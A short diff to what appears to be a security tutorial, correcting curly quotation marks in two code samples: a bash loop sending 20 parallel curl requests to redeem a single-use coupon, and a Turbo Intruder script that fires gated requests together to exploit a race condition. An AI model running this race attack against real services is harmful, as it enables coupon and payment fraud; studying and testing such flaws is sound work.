@@ -267,7 +267,7 @@ for i in $(seq 1 20); do
   curl -s -X POST https://example.com/api/redeem-coupon \
     -H "Cookie: session=USER_SESSION" \
     -H "Content-Type: application/json" \
-    -d ‘{"code":"SINGLE-USE-CODE"}’ &
+    -d '{"code":"SINGLE-USE-CODE"}' &
 done
 wait
 ```
@@ -281,8 +281,8 @@ def queueRequests(target, wordlists):
                            requestsPerConnection=1,
                            pipeline=False)
     for i in range(20):
-        engine.queue(target.req, gate=’race’)
-    engine.openGate(‘race’)
+        engine.queue(target.req, gate='race')
+    engine.openGate('race')
 
 def handleResponse(req, interesting):
     table.add(req)
